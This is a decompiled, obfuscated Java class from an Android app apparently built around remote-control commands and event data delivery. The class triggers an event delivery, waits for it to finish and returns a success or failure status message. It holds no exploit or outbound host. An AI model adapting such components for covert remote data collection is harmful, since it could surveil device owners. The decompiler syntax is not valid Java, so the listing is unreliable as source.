package com.vvt.appengine.a;

import android.os.ConditionVariable;

import com.vvt.appengine.AppEngine1;
import com.vvt.datadeliverymanager.i;
import com.vvt.eventdelivery.f;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

public class bc
{
  private static final boolean a = com.vvt.ak.a.a;
  private ConditionVariable b;
  private com.vvt.datadeliverymanager.a.a c;
  private RmtCtrlOutputStatusMessage d;
  
  public bc()
  {
    Object localObject = new com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    ((RmtCtrlOutputStatusMessage)localObject).<init>();
    this.d = ((RmtCtrlOutputStatusMessage)localObject);
    localObject = b();
    this.c = ((com.vvt.datadeliverymanager.a.a)localObject);
  }
  
  private com.vvt.datadeliverymanager.a.a b()
  {
    bd localbd = new com/vvt/appengine/a/bd;
    localbd.<init>(this);
    return localbd;
  }
  
  public RmtCtrlOutputStatusMessage a(AppEngine1 paramh)
  {
    try
    {
      Object localObject1 = new android/os/ConditionVariable;
      com.vvt.datadeliverymanager.a.a locala = null;
      ((ConditionVariable)localObject1).<init>(false);
      this.b = ((ConditionVariable)localObject1);
      localObject1 = paramh.i;
      locala = this.c;
      ((f)localObject1).a(locala);
      localObject1 = this.b;
      ((ConditionVariable)localObject1).block();
      localObject1 = paramh.i;
      ((f)localObject1).e();
      localObject1 = this.d;
      return (RmtCtrlOutputStatusMessage)localObject1;
    }
    finally {}
  }
  
  void a(i parami)
  {
    synchronized (this.d)
    {
      RmtCtrlOutputStatusMessage localRmtCtrlOutputStatusMessage2 = this.d;
      boolean bool = parami.f();
      localRmtCtrlOutputStatusMessage2.setSuccess(bool);
      localRmtCtrlOutputStatusMessage2 = this.d;
      String str = parami.e();
      localRmtCtrlOutputStatusMessage2.setMessage(str);
      return;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/bc.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */